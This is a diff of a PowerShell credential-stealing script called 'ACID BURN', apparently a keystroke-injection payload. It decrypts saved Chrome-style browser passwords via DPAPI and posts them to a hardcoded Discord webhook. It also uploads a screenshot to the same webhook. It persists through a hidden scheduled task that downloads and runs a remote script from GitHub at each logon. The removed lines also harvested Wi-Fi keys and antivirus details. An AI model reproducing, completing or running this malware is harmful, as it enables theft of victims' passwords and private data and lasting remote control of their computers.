@@ -3,28 +3,6 @@ try {
     "=== ACID BURN ===" | Out-File $out
     "Host: $env:COMPUTERNAME" | Out-File $out -Append
     "User: $env:USERNAME" | Out-File $out -Append
-    "Domain: $env:USERDOMAIN" | Out-File $out -Append
-    "OS: $((Get-CimInstance Win32_OperatingSystem).Caption)" | Out-File $out -Append
-    "Arch: $env:PROCESSOR_ARCHITECTURE" | Out-File $out -Append
-    "IP: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch 'Loopback'}).IPAddress -join ', ')" | Out-File $out -Append
-    "" | Out-File $out -Append
-
-    "--- AV ---" | Out-File $out -Append
-    $av = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
-    if ($av) { $av.displayName | Out-File $out -Append } else { "(none)" | Out-File $out -Append }
-    "" | Out-File $out -Append
-
-    "--- WIFI ---" | Out-File $out -Append
-    $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
-        ($_ -split ":")[1].Trim()
-    }
-    if ($profiles) {
-        foreach ($p in $profiles) {
-            $details = netsh wlan show profile name="$p" key=clear
-            $key = ($details | Select-String "Key Content") -replace ".*:\s*", ""
-            if ($key) { "$p : $key" | Out-File $out -Append }
-        }
-    } else { "(none)" | Out-File $out -Append }
     "" | Out-File $out -Append
 
     "--- BROWSER PASSWORDS ---" | Out-File $out -Append
@@ -56,30 +34,31 @@ try {
             $tmp = "$env:TEMP\ab_login.db"
             Copy-Item $loginDb $tmp -Force
 
-            # use sqlite via .NET if available, else fall back to strings
-            $rows = & {
-                $sqlite = [System.Reflection.Assembly]::LoadWithPartialName("System.Data.SQLite")
-                if ($sqlite) {
-                    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
-                    $conn.Open()
-                    $cmd = $conn.CreateCommand()
-                    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-                    $reader = $cmd.ExecuteReader()
-                    while ($reader.Read()) {
-                        $u = $reader.GetString(1)
-                        $pEnc = $reader.GetValue(2)
-                        if ($pEnc -is [byte[]] -and $pEnc.Length -gt 0) {
-                            try {
-                                $pDec = [System.Security.Cryptography.ProtectedData]::Unprotect($pEnc, $null, "CurrentUser")
-                                $pStr = [System.Text.Encoding]::UTF8.GetString($pDec)
-                            } catch { $pStr = "(encrypted)" }
-                        } else { $pStr = "" }
-                        if ($u) { "$($reader.GetString(0)) | $u | $pStr" }
+            $sqlite = [System.Reflection.Assembly]::LoadWithPartialName("System.Data.SQLite")
+            if ($sqlite) {
+                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
+                $conn.Open()
+                $cmd = $conn.CreateCommand()
+                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+                $reader = $cmd.ExecuteReader()
+                while ($reader.Read()) {
+                    $u = $reader.GetString(1)
+                    $pEnc = $reader.GetValue(2)
+                    $pStr = ""
+                    if ($pEnc -is [byte[]] -and $pEnc.Length -gt 3) {
+                        try {
+                            $blob = $pEnc
+                            if ($blob[0] -eq 118 -and $blob[1] -eq 49 -and $blob[2] -eq 48) {
+                                $blob = $blob[3..($blob.Length-1)]
+                            }
+                            $pDec = [System.Security.Cryptography.ProtectedData]::Unprotect($blob, $null, "CurrentUser")
+                            $pStr = [System.Text.Encoding]::UTF8.GetString($pDec)
+                        } catch { $pStr = "(fail)" }
                     }
-                    $conn.Close()
+                    if ($u) { "$($reader.GetString(0)) | $u | $pStr" }
                 }
+                $conn.Close()
             }
-            $rows | Out-File $out -Append
         }
         "" | Out-File $out -Append
     }
@@ -90,7 +69,6 @@ try {
     $body = $body.Substring(0, [Math]::Min(1900, $body.Length))
 
     $url = "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT"
-
     $payload = @{ content = $body } | ConvertTo-Json -Compress
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
     Invoke-RestMethod -Uri $url -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"
@@ -104,24 +82,21 @@ try {
     $gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
     $shot = "$env:TEMP\ab_shot.png"
     $bmp.Save($shot, [System.Drawing.Imaging.ImageFormat]::Png)
-    $gfx.Dispose()
-    $bmp.Dispose()
+    $gfx.Dispose(); $bmp.Dispose()
 
     Add-Type -AssemblyName System.Net.Http
     $client = New-Object System.Net.Http.HttpClient
     $content = New-Object System.Net.Http.MultipartFormDataContent
-    $fileStream = [System.IO.File]::OpenRead($shot)
-    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
-    $content.Add($fileContent, "file", "screen.png")
-    $resp = $client.PostAsync($url, $content).Result
-    $fileStream.Close()
-    $client.Dispose()
+    $fs = [System.IO.File]::OpenRead($shot)
+    $fc = New-Object System.Net.Http.StreamContent($fs)
+    $fc.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("image/png")
+    $content.Add($fc, "file", "screen.png")
+    $client.PostAsync($url, $content).Result | Out-Null
+    $fs.Close(); $client.Dispose()
 
     # --- PERSISTENCE ---
-    $taskName = "AcidBurn"
     $cmd = "powershell -w hidden -ep bypass -c `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/stargosg/Ducky/refs/heads/main/x.ps1')`""
-    schtasks /create /tn $taskName /tr $cmd /sc onlogon /f 2>$null
+    schtasks /create /tn "AcidBurn" /tr $cmd /sc onlogon /f 2>$null
 }
 catch {
     $_ | Out-File "$env:TEMP\ab_error.txt"
